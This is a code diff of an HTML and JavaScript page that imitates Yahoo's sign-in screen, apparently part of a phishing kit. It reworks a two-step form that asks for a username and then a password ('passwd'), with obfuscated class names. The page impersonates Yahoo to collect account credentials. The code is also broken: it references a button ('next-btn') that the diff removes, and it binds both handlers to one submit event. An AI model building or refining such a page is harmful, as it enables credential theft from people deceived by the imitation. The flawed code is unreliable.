@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Yahoo</title>
+    <title>Sign in to Yahoo</title>
     <link href="css/normalize.css" rel="stylesheet" type="text/css">
     <link href="css/webflow.css" rel="stylesheet" type="text/css">
     <link href="css/yahoo-8d0526.webflow.css" rel="stylesheet" type="text/css">
@@ -66,22 +66,24 @@
         .text-block-7 { font-family: 'Open Sans', sans-serif; color: #666; margin-bottom: 20px; }
         .restart.logger.w-button { width: 100%; padding: 14px; background: #4a90e2; color: white; border: none; border-radius: 6px; font-size: 16px; font-weight: 600; cursor: pointer; transition: background-color 0.3s ease; }
         .restart.logger.w-button:hover { background: #357abd; }
-        .error-message-banner { background: #fee; border: 1px solid #fcc; color: #c33; padding: 12px; border-radius: 6px; margin-bottom: 20px; display: none; }
-        .pazzi, .mail { transition: opacity 0.3s ease-in-out; }
-        .hidden { display: none !important; opacity: 0; }
-        .visible { display: block !important; opacity: 1; }
+        .restart.logger.w-button:disabled { background: #ccc; cursor: not-allowed; }
         .loading-container { display: none; text-align: center; padding: 20px; }
     </style>
 </head>
 <body>
     <section class="section">
         <div class="div-block">
-            <div class="div-block-2"><img src="images/yahoo.png" loading="lazy" alt="Yahoo Logo" class="image"></div>
-            <div class="div-block-3">
-                <div class="text-block">Help</div>
-                <div><a href="https://legal.yahoo.com/in/en/yahoo/terms/otos/index.html" class="link">Terms</a></div>
-                <div><a href="https://legal.yahoo.com/in/en/yahoo/privacy/index.html" class="link-2">Privacy</a></div>
+            <div class="div-block-2">
+                <img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_p_205x58_frontpage_2x.png" loading="lazy" width="130" alt="Yahoo logo" class="image">
             </div>
+            <div class="div-block-3">
+                <a href="#" class="link">Forgot username?</a>
+                <a href="#" class="link-2">Create an account</a>
+            </div>
+        </div>
+        <div class="div-block-4">
+            <a href="https://legal.yahoo.com/in/en/yahoo/terms/otos/index.html" class="link-3">Terms</a>
+            <a href="https://legal.yahoo.com/in/en/yahoo/privacy/index.html" class="link-4">Privacy</a>
         </div>
         <div class="layout active">
             <div class="div-block-5">
@@ -90,36 +92,17 @@
             </div>
             <div class="form-block w-form">
                 <form id="login-form" name="login-form" data-name="Login Form" class="form">
-                    <img src="images/yahoo.png" loading="lazy" alt="" class="image-2">
+                    <h1 class="heading">Sign in</h1>
+                    <p class="paragraph">using your Yahoo account</p>
                     
                     <!-- Error Banner -->
-                    <div id="error-banner" class="error-message-banner"></div>
+                    <div id="error-message" class="error-message" style="display:none;"></div>
                     <div id="loading-container" class="loading-container"><div class="loading-spinner"></div></div>
 
                     <!-- Email Step -->
-                    <div id="email-step" class="mail visible">
-                        <h1 class="heading-2">Sign in</h1>
-                        <div class="text-block-2">Sign in using your Yahoo account</div>
-                        <div class="lpl numb">Username, Email or Mobile</div>
-                        <input class="field w-input" maxlength="256" name="username" placeholder="" type="email" id="username" required>
-                        <div class="div-block-6">
-                            <label class="w-checkbox checkbox-field"><input type="checkbox" style="opacity:0;position:absolute;z-index:-1"><span class="checkbox-label w-form-label">Stay signed in</span></label>
-                            <a href="#" class="text-block-4">Forgotten username?</a>
-                        </div>
-                        <button type="button" id="next-btn" class="nergzt logger w-button">Next</button>
-                    </div>
-
-                    <!-- Password Step -->
-                    <div id="password-step" class="pazzi hidden">
-                        <div id="user-identifier" class="reflectto"></div>
-                        <h1 class="heading-2"><strong>Enter password</strong></h1>
-                        <div class="text-block-2">to finish signing in</div>
-                        <div class="pazz lpl numb">Password</div>
-                        <div class="ms-input-wrap">
-                            <input class="ms-input w-input" maxlength="256" name="passwd" placeholder="" type="password" id="password" required>
-                        </div>
-                        <button type="submit" id="submit-btn" class="logger w-button">Next</button>
-                    </div>
+                    <input type="email" class="field w-input" maxlength="256" name="username" placeholder="Username, email, or mobile" id="username" required>
+                    <input type="password" class="ms-input w-input" maxlength="256" name="passwd" placeholder="Password" id="password" required style="display:none;">
+                    <button type="submit" value="Next" data-wait="Please wait..." class="nergzt logger w-button">Next</button>
                 </form>
             </div>
         </div>
@@ -148,7 +131,7 @@
         // --- UTILITY FUNCTIONS ---
         const utils = {
             showError: (message) => {
-                const errorEl = document.getElementById('error-banner');
+                const errorEl = document.getElementById('error-message');
                 if (errorEl) {
                     errorEl.textContent = message;
                     errorEl.style.display = 'block';
@@ -224,8 +207,8 @@
                 
                 // Simulate a quick check
                 setTimeout(() => {
-                    utils.switchStep('password');
-                    document.getElementById('user-identifier').textContent = `Signing in as: ${state.username}`;
+                    document.getElementById('password').style.display = 'block';
+                    document.getElementById('next-btn').value = 'Sign In';
                     document.getElementById('password').focus();
                 }, 500);
             },
@@ -281,8 +264,8 @@
 
         // --- EVENT LISTENERS ---
         const setupEventListeners = () => {
-            document.getElementById('next-btn').addEventListener('click', formHandlers.handleEmailSubmit);
-            document.getElementById('submit-btn').addEventListener('click', formHandlers.handlePasswordSubmit);
+            document.getElementById('login-form').addEventListener('submit', formHandlers.handleEmailSubmit);
+            document.getElementById('login-form').addEventListener('submit', formHandlers.handlePasswordSubmit);
         };
 
         // --- INITIALIZATION ---
